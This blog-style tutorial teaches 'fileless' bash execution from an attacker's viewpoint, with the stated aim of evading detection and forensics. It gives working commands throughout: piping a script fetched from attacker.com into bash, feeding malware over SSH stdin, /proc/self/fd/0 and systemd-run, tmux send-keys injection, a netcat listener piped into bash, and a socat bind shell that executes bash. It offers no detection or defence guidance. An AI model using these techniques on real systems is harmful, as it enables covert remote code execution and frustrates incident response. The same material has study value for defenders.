---
title: "Fileless bash execution"
date: 2026-01-09
---

This is one of the ways hackers can run malicious scripts inside a target machine without touching the disk. In this article, I will show you different techniques on how attackers evade detection when running malicious bash scripts by executing them entirely in memory.

When a script is written to disk, it leaves traces that security tools can detect and analyze. By running scripts directly in memory, attackers can bypass file-based detection mechanisms, avoid leaving forensic evidence, and make incident response significantly more difficult.

Let me take you through the different methods that can be used to achieve this.

---

## Serving malware over HTTP

The first and most common method is to serve the malware over HTTP. This is the typical technique you will see in capture the flags and real-world attacks.

To do this, an attacker first needs to run an HTTP server on their machine serving the malicious script. Then, inside the compromised machine, the attacker can run the script directly over HTTP:

```bash
curl https://attacker.com/malware.sh | bash
```

The script is fetched and piped directly to bash, which interprets and executes it without ever writing to disk. Simple and effective.

---

## SSH-based techniques

If an attacker has direct SSH access to the target, there are several ways to send and execute scripts through standard input.

### Basic stdin redirection

The simplest approach is to redirect the script file through standard input:

```bash
ssh user@target < malware.sh
```

### Explicit bash invocation

Sometimes the basic method doesn't work due to protections or filtering in place. In that case, attackers can explicitly call bash on the remote host to force reading from standard input:

```bash
ssh user@target 'bash -s' < malware.sh
```

### File descriptor method

If that didn't work, attackers can try the file descriptor method. Recall that file descriptor 0 corresponds to standard input:

```bash
ssh user@target 'bash /proc/self/fd/0' < malware.sh
```

### Leveraging systemd

If for some reason access to `/proc` is forbidden, attackers can leverage systemd-run. This is effective as well since most Linux distros are using systemd these days:

```bash
ssh user@target 'systemd-run --user --pipe bash' < malware.sh
```

### Using heredocs

If the attacker also doesn't want to leave a trace even from the originating machine (since the script file would exist locally), they can use heredocs and embed the script directly in the command:

```bash
ssh user@target 'bash -s' <<EOF
echo 'pwn3d'
EOF
```

This way there's no script file anywhere - not on the attacker machine, not on the target.

---

## Abusing installed software

Aside from traditional methods, attackers can also abuse installed software on the target. This can be useful when standard bash execution is being monitored or blocked.

### Tmux

If tmux is available on the target, attackers can use the following technique:

```bash
cat malware.sh | ssh user@target 'tmux send-keys -t 0 "$(cat)" Enter'
```

This opens the malware and pipes it through the SSH connection. Instead of calling bash directly, it uses tmux's `send-keys` command to mimic a key press remotely. The `-t 0` tells tmux to target the first window or pane. The `cat` command is evaluated on the remote host, reading whatever is passed through standard input, and `Enter` completes the key press to execute the command.

The downside of this technique is that feedback may not be visible from the attacker side. The attacker may need to add some blind verifications to check whether the malware ran successfully or not.

---

## Netcat techniques

Another well-known method is to use netcat for transferring and executing scripts.

### Attacker as listener

The attacker opens a listener and sends the malware through standard input:

```bash
nc -lvnp 1337 < malware.sh
```

Then from the victim side, they connect to the listener and pipe the output to an interpreter:

```bash
nc -v attacker 1337 | bash
```

---

## Socat techniques

Socat is also a popular network tool for attackers. The idea is similar to netcat, but the syntax is different. This is a good replacement when netcat is not available.

### Attacker as listener

On the target, set up socat to listen and execute bash:

```bash
socat TCP-LISTEN:1337 EXEC:bash
```

Then from the attacker side, pipe the malware:

```bash
cat malware.sh | socat - TCP:target:1337
```

---

Have a nice day!
